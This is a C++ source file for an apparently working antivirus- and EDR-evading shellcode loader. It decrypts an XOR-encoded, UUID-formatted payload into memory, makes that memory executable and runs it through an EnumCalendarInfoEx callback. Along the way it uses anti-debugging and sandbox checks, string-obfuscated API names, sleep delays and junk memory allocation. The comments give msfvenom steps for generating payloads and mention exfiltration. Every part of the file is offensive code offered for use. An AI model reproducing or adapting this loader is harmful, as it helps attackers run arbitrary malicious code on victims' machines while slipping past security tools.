#include <windows.h>

// ------------------
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <rpc.h>
#include <vector>
using std::vector;

// set your xor key( it should be similar to the one you used in the "xor_encryptor.py" )
#define XOR_KEY "CHANGEME"

#define EXE_NAME "lazarus.exe"

#define FAKE_OFFSET 0x1f // confuse the reverse engineer till she/he laughs at people blinking

// each single UUID string( C-style string ) comprises:
// std uuid content( 36 characters ) + NULL terminator == 37
#define UUID_LINE_LEN 37

#define LOTS_OF_MEM 250'000'000

// the MAGICAL( but random ) byte
#define MAGIC_BYTE 0xf1

// Uncomment the line below if you're using Visual Studio for compiling.
// #pragma comment(lib, "Rpcrt4.lib")

BOOL(WINAPI *pMVP)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
LPVOID(WINAPI *pMVA)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

typedef LPVOID(WINAPI *pVirtualAllocExNuma)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType,
                                            DWORD flProtect, DWORD nndPreferred);

bool checkNUMA()
{
        LPVOID mem{NULL};
        const char k32DllName[13]{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0};
        const char vAllocExNuma[19]{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l',
                                    'o', 'c', 'E', 'x', 'N', 'u', 'm', 'a', 0x0};
        pVirtualAllocExNuma myVirtualAllocExNuma =
            (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle(k32DllName), vAllocExNuma);
        mem =
            myVirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
        if (mem != NULL)
        {
                return false;
        }
        else
        {
                return true;
        }
}

bool checkResources()
{
        SYSTEM_INFO s{};
        MEMORYSTATUSEX ms{};
        DWORD procNum{};
        DWORD ram{};

        GetSystemInfo(&s);
        procNum = s.dwNumberOfProcessors;
        if (procNum < 2)
                return false;

        ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
        if (ram < 2)
                return false;

        return true;
}

void XOR(BYTE *data, unsigned long data_len, const char *key, unsigned long key_len)
{
        unsigned long i{0x0345};
        {
                size_t i{};
                do
                {
                        i <<= FAKE_OFFSET;
                        data[i >> FAKE_OFFSET] ^= key[(i >> FAKE_OFFSET) % key_len];
                        i >>= FAKE_OFFSET;
                        ++i;
                } while (i % data_len);
        }
}

int main(int argc, char *argv[])
{
        FreeConsole();

        // 32-bit payload generation:
        // 1. msfvenom -p windows/exec CMD=calc.exe -f raw -o calc.bin
        // 2. python ./bin_to_uuid.py -p calc.bin -o calc.uuid
        // 3. python ./xor_encryptor.py calc.uuid > calc.xor
        vector<BYTE> payload{
            0x73, 0x78, 0x79, 0x7C, 0x22, 0x7D, 0x2B, 0x26, 0x6E, 0x78, 0x71, 0x7E, 0x77, 0x68, 0x75, 0x7C, 0x75, 0x78,
            0x6C, 0x2B, 0x72, 0x76, 0x7C, 0x68, 0x20, 0x78, 0x77, 0x7A, 0x7F, 0x27, 0x78, 0x75, 0x70, 0x78, 0x79, 0x2C,
            0x4D, 0x70, 0x7F, 0x7D, 0x21, 0x78, 0x22, 0x7B, 0x75, 0x68, 0x75, 0x27, 0x72, 0x7C, 0x6C, 0x7C, 0x7F, 0x72,
            0x7F, 0x68, 0x73, 0x2E, 0x23, 0x79, 0x6A, 0x71, 0x2C, 0x77, 0x75, 0x7B, 0x70, 0x28, 0x21, 0x24, 0x2E, 0x76,
            0x20, 0x42, 0x73, 0x2D, 0x77, 0x77, 0x7A, 0x26, 0x75, 0x79, 0x6C, 0x2D, 0x76, 0x77, 0x7D, 0x68, 0x73, 0x2C,
            0x22, 0x28, 0x6A, 0x75, 0x7C, 0x26, 0x74, 0x65, 0x24, 0x7C, 0x21, 0x77, 0x78, 0x77, 0x76, 0x7F, 0x79, 0x2C,
            0x72, 0x77, 0x47, 0x76, 0x20, 0x7C, 0x20, 0x76, 0x25, 0x74, 0x7D, 0x68, 0x77, 0x2B, 0x79, 0x2C, 0x6A, 0x72,
            0x75, 0x74, 0x72, 0x65, 0x24, 0x7D, 0x73, 0x7D, 0x60, 0x75, 0x72, 0x2C, 0x70, 0x7B, 0x76, 0x7D, 0x2F, 0x70,
            0x7A, 0x7A, 0x71, 0x44, 0x73, 0x7C, 0x75, 0x27, 0x27, 0x7B, 0x71, 0x7F, 0x6A, 0x20, 0x7E, 0x74, 0x7B, 0x65,
            0x75, 0x77, 0x74, 0x24, 0x60, 0x7D, 0x21, 0x7B, 0x75, 0x63, 0x7F, 0x27, 0x7D, 0x74, 0x27, 0x7E, 0x72, 0x7F,
            0x21, 0x23, 0x2C, 0x26, 0x49, 0x78, 0x70, 0x7E, 0x23, 0x26, 0x2B, 0x26, 0x72, 0x65, 0x72, 0x76, 0x24, 0x72,
            0x60, 0x72, 0x76, 0x2D, 0x71, 0x63, 0x21, 0x73, 0x7D, 0x76, 0x6E, 0x7F, 0x25, 0x28, 0x7F, 0x76, 0x2F, 0x72,
            0x27, 0x7A, 0x75, 0x79, 0x72, 0x4F, 0x78, 0x7D, 0x7B, 0x2A, 0x74, 0x76, 0x22, 0x71, 0x60, 0x75, 0x72, 0x7A,
            0x75, 0x63, 0x71, 0x73, 0x29, 0x76, 0x6E, 0x70, 0x23, 0x7E, 0x24, 0x68, 0x79, 0x27, 0x7B, 0x2A, 0x74, 0x76,
            0x76, 0x26, 0x7D, 0x74, 0x27, 0x7B, 0x4B, 0x7E, 0x76, 0x7D, 0x2F, 0x75, 0x77, 0x70, 0x23, 0x63, 0x7F, 0x7C,
            0x29, 0x75, 0x6E, 0x7A, 0x75, 0x7A, 0x73, 0x68, 0x7F, 0x71, 0x76, 0x2A, 0x6C, 0x7B, 0x25, 0x73, 0x7C, 0x70,
            0x7A, 0x7D, 0x20, 0x7B, 0x76, 0x23, 0x2B, 0x4F, 0x76, 0x29, 0x74, 0x28, 0x72, 0x23, 0x28, 0x75, 0x6E, 0x79,
            0x73, 0x76, 0x25, 0x68, 0x75, 0x21, 0x26, 0x2A, 0x6C, 0x7B, 0x23, 0x73, 0x2C, 0x68, 0x73, 0x79, 0x79, 0x2A,
            0x7F, 0x70, 0x2F, 0x77, 0x73, 0x78, 0x71, 0x7E, 0x4D, 0x76, 0x7C, 0x73, 0x7B, 0x7D, 0x71, 0x7E, 0x77, 0x68,
            0x7B, 0x23, 0x7B, 0x2A, 0x6C, 0x28, 0x21, 0x7D, 0x7A, 0x68, 0x27, 0x7D, 0x23, 0x2C, 0x6A, 0x23, 0x7D, 0x27,
            0x76, 0x29, 0x73, 0x7B, 0x71, 0x73, 0x75, 0x24, 0x75, 0x42, 0x27, 0x28, 0x7E, 0x21, 0x2F, 0x21, 0x7A, 0x7D,
            0x6C, 0x7D, 0x24, 0x21, 0x78, 0x68, 0x74, 0x2B, 0x71, 0x78, 0x6A, 0x75, 0x2C, 0x7D, 0x73, 0x65, 0x27, 0x2C,
            0x22, 0x75, 0x7A, 0x70, 0x73, 0x7D, 0x23, 0x2C, 0x73, 0x72, 0x47, 0x73, 0x22, 0x7E, 0x27, 0x79, 0x75, 0x74,
            0x7E, 0x68, 0x76, 0x7B, 0x71, 0x7E, 0x6A, 0x21, 0x78, 0x23, 0x25, 0x65, 0x77, 0x7D, 0x71, 0x74, 0x60, 0x73,
            0x20, 0x7E, 0x72, 0x7C, 0x22, 0x73, 0x78, 0x72, 0x7B, 0x7E, 0x74, 0x44, 0x7E, 0x75, 0x74, 0x75, 0x7A, 0x78,
            0x71, 0x7E, 0x6A, 0x7C, 0x7D, 0x7C, 0x73, 0x65, 0x78, 0x7E, 0x7E, 0x75, 0x60, 0x7C, 0x73, 0x71, 0x71, 0x63,
            0x7E, 0x75, 0x74, 0x75, 0x7A, 0x78, 0x78, 0x7E, 0x7E, 0x75, 0x74, 0x75};

        char key[]{XOR_KEY};

        if (strstr(argv[0], EXE_NAME) == NULL)
        {
                return -2;
        }

        if (IsDebuggerPresent())
        {
                return -2;
        }

        if (checkNUMA())
        {
                return -2;
        }

        // Uncomment if you're more interested in evading code emulators
        // if (checkResources() == false)
        // {
        //         return -2;
        // }

        const char virtProt[15]{'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0};

        Sleep(7500); // you could use "ekko" by crack5pider for this, i'm still lazy for this

        const char k32DllName[13]{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0};
        const char vAlloc[13]{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0};

        BYTE *junk_mem{(BYTE *)malloc(LOTS_OF_MEM)};
        if (junk_mem)
        {
                memset(junk_mem, MAGIC_BYTE, LOTS_OF_MEM);
                free(junk_mem);

#if DEBUG
                printf("Before xor: %s\n\n", payload.data());
#endif

                // a NULL terminator can cause very SERIOUS bugs so 1st remove it from the key
                XOR(payload.data(), payload.size(), key, (sizeof(key) - 1));

#if DEBUG
                printf("After xor: %s\n\n", payload.data());
#endif

                HMODULE k32_handle{GetModuleHandle(k32DllName)};
                BOOL rv{};
                char chars_array[UUID_LINE_LEN]{};
                DWORD oldprotect{0};
                char *temp{};

                pMVA = GetProcAddress(k32_handle, vAlloc);
                PVOID mem = pMVA(0, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                DWORD_PTR hptr = reinterpret_cast<DWORD_PTR>(mem);

                int i{}; // fool some AVs. maybe give them a detour :)
                for (temp = strtok((char *)payload.data(), "\n"); temp;)
                {
                        strncpy(chars_array, temp, UUID_LINE_LEN);
                        chars_array[UUID_LINE_LEN - 1] = 0x0; // the NULL byte :)

#if DEBUG
                        printf("Sub-string: %s\n\n", chars_array);
#endif

                        RPC_CSTR rcp_cstr = (RPC_CSTR)chars_array;
                        RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID *)hptr);
                        if (status != RPC_S_OK)
                        {
                                fprintf(stderr, "[-] UUID conversion error: try to make sure your XOR keys match or "
                                                "correct the way you set up the payload.\n");
                                CloseHandle(mem);
                                return EXIT_FAILURE;
                        }

                        hptr += 16;
                        temp = strtok(NULL, "\n");
                }

                pMVP = GetProcAddress(k32_handle, virtProt);
                rv = pMVP(mem, 0x100000, PAGE_EXECUTE_READ, &oldprotect);
                if (!rv)
                {
                        fprintf(stderr, "[-] Failed to change the permissions for shellcode's memory\n");
                        return EXIT_FAILURE;
                }

                // attack! boom! we like planning events! :)
                EnumCalendarInfoEx((CALINFO_ENUMPROCEX)mem, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
                CloseHandle(mem);

                // should be ready for exfil! but successful code might never reach here! :(
#if DEBUG
                printf("[+] PWNED!!\n\t\tYOU'RE IN!\n");
#endif
                return 0;
        }
        else
        {
                return EXIT_FAILURE; // survived that AV/EDR. Phew!!
        }
}
